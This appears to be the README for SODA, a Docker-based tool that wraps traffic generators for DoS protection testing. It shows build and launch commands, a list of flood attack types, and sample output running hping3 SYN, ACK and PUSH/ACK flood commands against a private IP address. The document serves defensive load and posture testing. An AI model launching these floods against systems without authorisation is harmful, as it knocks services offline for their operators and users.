# Simulation of DDoS Attacks
## Description
SODA wraps up together multiple traffic generation tools to symplify and unify DoS protection testing. It allows to send any kind DoS attack by specifying its name without figuring out flags for particular traffic generation tool.
Such approach also allows to standardize DoS posture testing because attack patterns are repeatable..
## Features
- Large list of predefined DoS attacks
- Sends single attack vector or morphs vector with predefined pattern and interval
- Automatically scales particular attack tool to multiple CPU cores
# Usage
1. Build SODA image
```
attacker@host$ docker build -t . soda
```
2. List all avaliable attacks and pick attack ID
```
attacker@host$ docker run --rm soda -l
0: TCP SYN Flood
1: NTP Flood
2: TCP SYN/ACK Flood
3: NTP Non-standard Port Flood
4: TCP Zero Sequence Flood
5: TCP ACK Flood
6: TCP PUSH/ACK Flood
```
3. Launch SODA
```
attacker@host$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock soda -d http://10.11.73.12/url.html -n vlan973 -i 3 -a 4
2019-08-01 18:20:30.350264 ATTACK START: TCP Zero Sequence Flood: hping3 -S -p 80 -M 0 --flood 10.11.73.12
2019-08-01 18:20:38.004443 ATTACK STOP: TCP Zero Sequence Flood
2019-08-01 18:20:38.034628 ATTACK START: TCP ACK Flood: hping3 -A -p 80 --flood 10.11.73.12
2019-08-01 18:20:45.697750 ATTACK STOP: TCP ACK Flood
2019-08-01 18:20:45.729307 ATTACK START: TCP PUSH/ACK Flood: hping3 -PA -p 80 -d 64 --flood 10.11.73.12
2019-08-01 18:20:53.370087 ATTACK STOP: TCP PUSH/ACK Flood
^CKilling all running containers...
goofy_keldysh
```
